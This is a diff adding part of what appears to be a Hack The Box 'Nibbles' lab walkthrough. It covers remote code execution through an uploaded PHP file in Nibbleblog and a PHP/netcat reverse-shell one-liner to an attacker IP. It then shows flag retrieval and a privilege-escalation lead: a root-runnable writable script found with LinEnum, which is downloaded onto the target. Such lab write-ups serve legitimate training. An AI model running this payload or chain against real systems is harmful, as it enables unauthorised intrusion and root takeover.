@@ -385,9 +385,285 @@ Warning: imagejpeg() expects parameter 1 to be resource, boolean given in /var/w
 Warning: imagedestroy() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 80
 ```
 
+Under `/content`, there is a `plugins` directory and another subdirectory for `my_image`. The full path is at `http://10.10.10.75/nibbleblog/content/private/plugins/my_image/`.
+
+* In this directory, we see two files, `db.xml` and `image.php`, with a recent last modified date, meaning that our upload was successful.
+* To check if we have command execution:
+
+```
+-[Wed Feb 14-10:03:43]-[table@parrot]-
+-[~]$ curl http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php
+uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
+```
+
+We have gained remote code execution on the web server, and the Apache server is running in the `nibbler` user context
+
+We can now modify our PHP file to obtain a reverse shell and start poking around the server.
+
+* Let us use the following `Bash` reverse shell one-liner and add it to our `PHP` script.
+
+```
+<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.16 9443 >/tmp/f"); ?> 
+```
+
+We upload the file again and start a `netcat` listener in our terminal:
+
+```
+0xdf@htb[/htb]$ nc -lvnp 9443
+
+listening on [any] 9443 ...
+```
+
+`cURL` the image page again or browse to it in `Firefox` at http://nibbleblog/content/private/plugins/my\_image/image.php to execute the reverse shell.
+
+```
+-[Wed Feb 14-10:12:49]-[table@parrot]-
+-[~]$ nc -lnvp 9443
+listening on [any] 9443 ...
+connect to [10.10.14.16] from (UNKNOWN) [10.10.10.75] 57830
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
+```
+
+Let's upgrade our shell to a "nicer" shell:
+
+```
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ cd /home/nibbler
+<ml/nibbleblog/content/private/plugins/my_image$ cd /home/nibbler            
+nibbler@Nibbles:/home/nibbler$ ls
+ls
+personal.zip  user.txt
+```
+
+Retrieve user flag:
+
+```
+nibbler@Nibbles:/home/nibbler$ cat user.txt	
+cat user.txt
+688fef55a59e79dd7bfb5c126386789d
+```
+
+***
+
+## Privilege Escalation
+
+We can unzip the `personal.zip` file in the `/home/nibbler` directory so lets do that:
+
+```
+nibbler@Nibbles:/home/nibbler$ ls
+ls
+personal.zip  user.txt
+nibbler@Nibbles:/home/nibbler$ unzip personal.zip
+unzip personal.zip
+Archive:  personal.zip
+   creating: personal/
+   creating: personal/stuff/
+  inflating: personal/stuff/monitor.sh  
+```
+
+We see a file called `monitor.sh`
+
+```
+nibbler@Nibbles:/home/nibbler/personal/stuff$ cat monitor.sh
+cat monitor.sh
+                  ####################################################################################################
+                  #                                        Tecmint_monitor.sh                                        #
+                  # Written for Tecmint.com for the post www.tecmint.com/linux-server-health-monitoring-script/      #
+                  # If any bug, report us in the link below                                                          #
+                  # Free to use/edit/distribute the code below by                                                    #
+                  # giving proper credit to Tecmint.com and Author                                                   #
+                  #                                                                                                  #
+                  ####################################################################################################
+#! /bin/bash
+# unset any variable which system may be using
+
+# clear the screen
+clear
+
+unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage
+
+while getopts iv name
+do
+        case $name in
+          i)iopt=1;;
+          v)vopt=1;;
+          *)echo "Invalid arg";;
+        esac
+done
+
+if [[ ! -z $iopt ]]
+then
+{
+wd=$(pwd)
+basename "$(test -L "$0" && readlink "$0" || echo "$0")" > /tmp/scriptname
+scriptname=$(echo -e -n $wd/ && cat /tmp/scriptname)
+su -c "cp $scriptname /usr/bin/monitor" root && echo "Congratulations! Script Installed, now run monitor Command" || echo "Installation failed"
+}
+fi
+
+if [[ ! -z $vopt ]]
+then
+{
+echo -e "tecmint_monitor version 0.1\nDesigned by Tecmint.com\nReleased Under Apache 2.0 License"
+}
+fi
+
+if [[ $# -eq 0 ]]
+then
+{
 
 
-?????????
+# Define Variable tecreset
+tecreset=$(tput sgr0)
 
-?????????
+# Check if connected to Internet or not
+ping -c 1 google.com &> /dev/null && echo -e '\E[32m'"Internet: $tecreset Connected" || echo -e '\E[32m'"Internet: $tecreset Disconnected"
+
+# Check OS Type
+os=$(uname -o)
+echo -e '\E[32m'"Operating System Type :" $tecreset $os
+
+# Check OS Release Version and Name
+cat /etc/os-release | grep 'NAME\|VERSION' | grep -v 'VERSION_ID' | grep -v 'PRETTY_NAME' > /tmp/osrelease
+echo -n -e '\E[32m'"OS Name :" $tecreset  && cat /tmp/osrelease | grep -v "VERSION" | cut -f2 -d\"
+echo -n -e '\E[32m'"OS Version :" $tecreset && cat /tmp/osrelease | grep -v "NAME" | cut -f2 -d\"
+
+# Check Architecture
+architecture=$(uname -m)
+echo -e '\E[32m'"Architecture :" $tecreset $architecture
+
+# Check Kernel Release
+kernelrelease=$(uname -r)
+echo -e '\E[32m'"Kernel Release :" $tecreset $kernelrelease
+
+# Check hostname
+echo -e '\E[32m'"Hostname :" $tecreset $HOSTNAME
+
+# Check Internal IP
+internalip=$(hostname -I)
+echo -e '\E[32m'"Internal IP :" $tecreset $internalip
+
+# Check External IP
+externalip=$(curl -s ipecho.net/plain;echo)
+echo -e '\E[32m'"External IP : $tecreset "$externalip
+
+# Check DNS
+nameservers=$(cat /etc/resolv.conf | sed '1 d' | awk '{print $2}')
+echo -e '\E[32m'"Name Servers :" $tecreset $nameservers 
+
+# Check Logged In Users
+who>/tmp/who
+echo -e '\E[32m'"Logged In users :" $tecreset && cat /tmp/who 
+
+# Check RAM and SWAP Usages
+free -h | grep -v + > /tmp/ramcache
+echo -e '\E[32m'"Ram Usages :" $tecreset
+cat /tmp/ramcache | grep -v "Swap"
+echo -e '\E[32m'"Swap Usages :" $tecreset
+cat /tmp/ramcache | grep -v "Mem"
+
+# Check Disk Usages
+df -h| grep 'Filesystem\|/dev/sda*' > /tmp/diskusage
+echo -e '\E[32m'"Disk Usages :" $tecreset 
+cat /tmp/diskusage
+
+# Check Load Average
+loadaverage=$(top -n 1 -b | grep "load average:" | awk '{print $10 $11 $12}')
+echo -e '\E[32m'"Load Average :" $tecreset $loadaverage
+
+# Check System Uptime
+tecuptime=$(uptime | awk '{print $3,$4}' | cut -f1 -d,)
+echo -e '\E[32m'"System Uptime Days/(HH:MM) :" $tecreset $tecuptime
+
+# Unset Variables
+unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage
+
+# Remove Temporary Files
+rm /tmp/osrelease /tmp/who /tmp/ramcache /tmp/diskusage
+}
+fi
+shift $(($OPTIND -1))
+```
+
+The shell script `monitor.sh` is a monitoring script, and it is owned by our `nibbler` user and writeable.
+
+Let us put this aside for now and pull in [LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh) to perform some automated privilege escalation checks.
+
+* First, download the script and then start a `Python` HTTP server using the command `sudo python3 -m http.server 8080`.
+
+```
+-[Wed Feb 14-10:59:37]-[table@parrot]-
+-[~]$ sudo python3 -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+10.10.10.75 - - [14/Feb/2024 10:59:58] "GET /LinEnum.sh HTTP/1.1" 200 -
+```
+
+On the target machine, download the LinEnum script, give it executable permissions, and execute it:
+
+```
+nibbler@Nibbles:/home/nibbler/personal/stuff$ wget http://10.10.14.16:8080/LinEnum.sh
+<er/personal/stuff$ wget http://10.10.14.16:8080/LinEnum.sh                  
+--2024-02-14 13:59:58--  http://10.10.14.16:8080/LinEnum.sh
+Connecting to 10.10.14.16:8080... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 46631 (46K) [text/x-sh]
+Saving to: 'LinEnum.sh'
+
+LinEnum.sh          100%[===================>]  45.54K   282KB/s    in 0.2s    
+
+2024-02-14 13:59:58 (282 KB/s) - 'LinEnum.sh' saved [46631/46631]
+
+nibbler@Nibbles:/home/nibbler/personal/stuff$ ls
+ls
+LinEnum.sh  monitor.sh
+nibbler@Nibbles:/home/nibbler/personal/stuff$ chmod +x LinEnum.sh
+chmod +x LinEnum.sh
+nibbler@Nibbles:/home/nibbler/personal/stuff$ ./LinEnum.sh
+./LinEnum.sh
+
+#########################################################
+# Local Linux Enumeration & Privilege Escalation Script #
+#########################################################
+# www.rebootuser.com
+# version 0.982
+
+[-] Debug Info
+[+] Thorough tests = Disabled
+
+
+Scan started at:
+Wed Feb 14 14:00:19 EST 2024
+
+
+### SYSTEM ##############################################
+[-] Kernel information:
+Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+
+<SNIP>
+
+
+[-] Super user account(s):
+root
+
+
+[+] We can sudo without supplying a password!
+Matching Defaults entries for nibbler on Nibbles:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User nibbler may run the following commands on Nibbles:
+    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+
+
+[+] Possible sudo pwnage!
+/home/nibbler/personal/stuff/monitor.sh
+
+
+<SNIP>
+
+
+### SCAN COMPLETE ####################################
+
+```
 
